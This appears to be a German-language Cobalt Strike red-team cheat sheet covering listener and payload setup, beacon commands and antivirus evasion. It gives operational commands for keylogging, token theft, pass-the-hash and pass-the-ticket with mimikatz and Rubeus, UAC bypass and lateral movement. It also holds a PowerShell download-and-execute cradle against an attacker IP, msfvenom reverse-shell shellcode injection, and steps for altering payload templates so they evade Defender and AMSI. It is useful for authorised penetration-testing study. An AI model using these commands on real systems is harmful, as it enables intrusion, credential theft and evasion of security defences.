# Cobalt Strike

### Listeners

### C2-Listener

`Cobalt Strike -> Listener -> Hinzufügen/Bearbeiten` dann können Sie auswählen, wo zugehört werden soll, welche Art von Beacon verwendet werden soll (http, dns, smb...) und mehr.

### Peer2Peer-Listener

Die Beacons dieser Listener müssen nicht direkt mit dem C2 kommunizieren, sie können über andere Beacons mit ihm kommunizieren.

`Cobalt Strike -> Listener -> Hinzufügen/Bearbeiten` dann müssen Sie die TCP- oder SMB-Beacons auswählen.

* Der **TCP-Beacon wird einen Listener auf dem ausgewählten Port einrichten**. Um sich mit einem TCP-Beacon zu verbinden, verwenden Sie den Befehl `connect <ip> <port>` von einem anderen Beacon.
* Der **SMB-Beacon wird auf einem Pipenamen mit dem ausgewählten Namen zuhören**. Um sich mit einem SMB-Beacon zu verbinden, müssen Sie den Befehl `link [ziel] [pipe]` verwenden.

### Payloads generieren und hosten

#### Payloads in Dateien generieren

`Angriffe -> Pakete ->`&#x20;

* **`HTMLApplication`** für HTA-Dateien
* **`MS Office Macro`** für ein Office-Dokument mit einem Makro
* **`Windows Executable`** für eine .exe, .dll oder Service-.exe
* **`Windows Executable (S)`** für eine **stageless** .exe, .dll oder Service-.exe (besser stageless als staged, weniger IoCs)

#### Payloads generieren und hosten

`Angriffe -> Web Drive-by -> Scripted Web Delivery (S)` Dadurch wird ein Skript/ausführbare Datei generiert, um den Beacon von Cobalt Strike in Formaten wie bitsadmin, exe, powershell und python herunterzuladen.

#### Payloads hosten

Wenn Sie bereits die Datei haben, die Sie in einem Webserver hosten möchten, gehen Sie einfach zu `Angriffe -> Web Drive-by -> Datei hosten` und wählen Sie die zu hostende Datei und die Webserver-Konfiguration aus.

### Beacon-Optionen

<pre class="language-bash"><code class="lang-bash"># Lokale .NET-Binärdatei ausführen
execute-assembly &#x3C;/pfad/zur/ausführbaren.exe>

# Bildschirmfotos
printscreen    # Einzelnes Bildschirmfoto über PrintScr-Methode aufnehmen
screenshot     # Einzelnes Bildschirmfoto aufnehmen
screenwatch    # Periodische Bildschirmfotos des Desktops aufnehmen
## Gehen Sie zu Ansicht -> Bildschirmfotos, um sie anzuzeigen

# Keylogger
keylogger [pid] [x86|x64]
## Ansicht > Tastenanschläge, um die gedrückten Tasten anzuzeigen

# Portscan
portscan [pid] [arch] [ziele] [ports] [arp|icmp|none] [maximale Verbindungen] # Portscan-Aktion in einen anderen Prozess injizieren
portscan [ziele] [ports] [arp|icmp|none] [maximale Verbindungen]

# Powershell
# Powershell-Modul importieren
powershell-import C:\pfad\zu\PowerView.ps1
powershell &#x3C;powershell-befehl hier eingeben>

# Benutzerimitation
## Token-Generierung mit Anmeldeinformationen
make_token [DOMAIN\benutzer] [passwort] # Token erstellen, um einen Benutzer im Netzwerk zu imitieren
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zum Zugriff auf C$ auf einem Computer zu verwenden
rev2self # Aufhören, das mit make_token generierte Token zu verwenden
## Die Verwendung von make_token erzeugt das Ereignis 4624: Ein Konto wurde erfolgreich angemeldet. Dieses Ereignis ist in einer Windows-Domäne sehr häufig, kann aber durch Filtern nach dem Anmeldetyp eingeschränkt werden. Wie oben erwähnt, verwendet es LOGON32_LOGON_NEW_CREDENTIALS, was Typ 9 ist.

# UAC-Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Token von pid stehlen
## Ähnlich wie make_token, aber das Token wird von einem Prozess gestohlen
steal_token [pid] # Außerdem ist dies nützlich für Netzwerkaktionen, nicht für lokale Aktionen
## Aus der API-Dokumentation wissen wir, dass dieser Anmeldetyp "dem Aufrufer das Klonen seines aktuellen Tokens ermöglicht". Deshalb gibt die Beacon-Ausgabe Impersonated &#x3C;aktueller_benutzername> an - es ahmt unser eigenes geklontes Token nach.
ls \\computer_name\c$ # Versuchen Sie, das generierte Token zum Zugriff auf C$ auf einem Computer zu verwenden
rev2self # Aufhören, das Token von steal_token zu verwenden

## Prozess mit neuen Anmeldeinformationen starten
spawnas [domäne\benutzername] [passwort] [listener] # Führen Sie es von einem Verzeichnis mit Lesezugriff aus, z.B. cd C:\
## Wie make_token erzeugt dies auch das Windows-Ereignis 4624: Ein Konto wurde erfolgreich angemeldet, jedoch mit einem Anmeldetyp von 2 (LOGON32_LOGON_INTERACTIVE). Es werden der aufrufende Benutzer (TargetUserName) und der imitierte Benutzer (TargetOutboundUserName) angegeben.

## In Prozess injizieren
inject [pid] [x64|x86] [listener]
## Aus OpSec-Sicht: Führen Sie keine plattformübergreifende Injektion durch, es sei denn, es ist wirklich erforderlich (z.B. x86 -> x64 oder x64 -> x86).

## Pass the Hash
## Dieser Änderungsprozess erfordert das Patchen des LSASS-Speichers, was eine riskante Aktion ist, Administratorrechte erfordert und nicht sehr praktikabel ist, wenn Protected Process Light (PPL) aktiviert ist.
pth [pid] [arch] [DOMAIN\benutzer] [NTLM-Hash]
pth [DOMAIN\benutzer] [NTLM-Hash]

## Pass the Hash über mimikatz
mimikatz sekurlsa::pth /user:&#x3C;benutzername> /domain:&#x3C;DOMÄNE> /ntlm:&#x3C;NTLM-HASH> /run:"powershell -w hidden"
## Ohne /run startet mimikatz eine cmd.exe. Wenn Sie als Benutzer mit Desktop ausgeführt werden, sehen Sie die Shell (wenn Sie als SYSTEM ausgeführt werden, sind Sie bereit).
steal_token &#x3C;pid> # Token von von mimikatz erstelltem Prozess stehlen

## Pass the Ticket
## Ticket anfordern
execute-assembly C:\pfad\Rubeus.exe asktgt /user:&#x3C;benutzername> /domain:&#x3C;domäne> /aes256:&#x3C;aes-schlüssel> /nowrap /opsec
## Eine neue Anmeldesitzung erstellen, um sie mit dem neuen Ticket zu verwenden (um das kompromittierte Ticket nicht zu überschreiben)
make_token &#x3C;domäne>\&#x3C;benutzername> DummyPass
## Das Ticket in der Angreifermaschine schreiben und laden
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Ticket von SYSTEM stehlen
## Einen neuen Prozess mit dem Ticket generieren
execute-assembly C:\pfad\Rubeus.exe asktgt /user:&#x3C;BENUTZERNAME> /domain:&#x3C;DOMÄNE> /aes256:&#x3C;AES-SCHLÜSSEL> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Das Token von diesem Prozess stehlen
steal_token &#x3C;pid>

## Ticket extrahieren + Ticket weitergeben
### Tickets auflisten
execute-assembly C:\pfad\Rubeus.exe triage
### Interessantes Ticket nach LUID dumpen
execute-assembly C:\pfad\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Erstellen Sie eine neue Anmeldesitzung, notieren Sie die LUID und die Prozess-ID
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Fügen Sie das Ticket in die generierte Anmeldesitzung ein
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Schließlich stehlen Sie das Token von diesem neuen Prozess
steal_token &#x3C;pid>

# Laterale Bewegung
## Wenn ein Token erstellt wurde, wird es verwendet
jump [Methode] [Ziel] [Listener]
## Methoden:
## psexec                    x86   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec64                  x64   Verwenden Sie einen Dienst, um ein Service EXE-Artefakt auszuführen
## psexec_psh                x86   Verwenden Sie einen Dienst, um einen PowerShell-Einzeller auszuführen
## winrm                     x86   Führen Sie ein PowerShell-Skript über WinRM aus
## winrm64                   x64   Führen Sie ein PowerShell-Skript über WinRM aus

remote-exec [Methode] [Ziel] [Befehl]
## Methoden:
<strong>## psexec                          Remote-Ausführung über den Dienststeuerungs-Manager
</strong>## winrm                           Remote-Ausführung über WinRM (PowerShell)
## wmi                             Remote-Ausführung über WMI

## Um einen Beacon mit WMI auszuführen (es ist nicht im Sprungbefehl enthalten), laden Sie den Beacon einfach hoch und führen Sie ihn aus
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Sitzung an Metasploit übergeben - Über Listener
## Auf dem Metasploit-Host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Auf Cobalt: Listeners > Hinzufügen und setzen Sie das Payload auf Foreign HTTP. Setzen Sie den Host auf 10.10.5.120, den Port auf 8080 und klicken Sie auf Speichern.
beacon> spawn metasploit
## Sie können nur x86 Meterpreter-Sitzungen mit dem fremden Listener spawnen.

# Sitzung an Metasploit übergeben - Durch Shellcode-Injektion
## Auf dem Metasploit-Host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Führen Sie msfvenom aus und bereiten Sie den multi/handler-Listener vor

## Bin-Datei auf den Cobalt Strike-Host kopieren
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injizieren Sie den Metasploit-Shellcode in einen x64-Prozess

# Metasploit-Sitzung an Cobalt Strike übergeben
## Erzeugen Sie stageless Beacon-Shellcode, gehen Sie zu Angriffe > Pakete > Windows Executable (S), wählen Sie den gewünschten Listener aus, wählen Sie Raw als Ausgabetyp und wählen Sie Use x64 payload aus.
## Verwenden Sie post/windows/manage/shellcode_inject in Metasploit, um den generierten Cobalt Strike-Shellcode einzufügen


# Pivoting
## Öffnen Sie einen Socks-Proxy im Teamserver
beacon> socks 1080

# SSH-Verbindung
beacon> ssh 10.10.17.12:22 Benutzername Passwort</code></pre>

## AVs vermeiden

### Artefakt-Kit

Normalerweise finden Sie den Code und die vorkompilierten Vorlagen (in `/src-common`) der Payloads, die Cobalt Strike verwenden wird, um die binären Beacons zu generieren, in `/opt/cobaltstrike/artifact-kit`.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) und dem generierten Backdoor (oder nur mit der kompilierten Vorlage) können Sie herausfinden, was Defender auslöst. Normalerweise handelt es sich um einen String. Sie können also einfach den Code ändern, der das Backdoor generiert, damit dieser String nicht im endgültigen Binärcode erscheint.

Nachdem Sie den Code geändert haben, führen Sie einfach `./build.sh` im selben Verzeichnis aus und kopieren Sie den Ordner `dist-pipe/` in den Windows-Client unter `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Vergessen Sie nicht, das aggressive Skript `dist-pipe\artifact.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir möchten und nicht die geladenen.

### Ressourcen-Kit

Der Ressourcen-Kit-Ordner enthält die Vorlagen für Cobalt Strikes skriptbasierte Payloads, einschließlich PowerShell, VBA und HTA.

Mit [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) und den Vorlagen können Sie herausfinden, was der Verteidiger (in diesem Fall AMSI) nicht mag und es anpassen:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Durch Änderung der erkannten Zeilen kann man eine Vorlage generieren, die nicht erfasst wird.

Vergiss nicht, das aggressive Skript `ResourceKit\resources.cna` zu laden, um Cobalt Strike anzuweisen, die Ressourcen von der Festplatte zu verwenden, die wir möchten, und nicht die geladenen.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

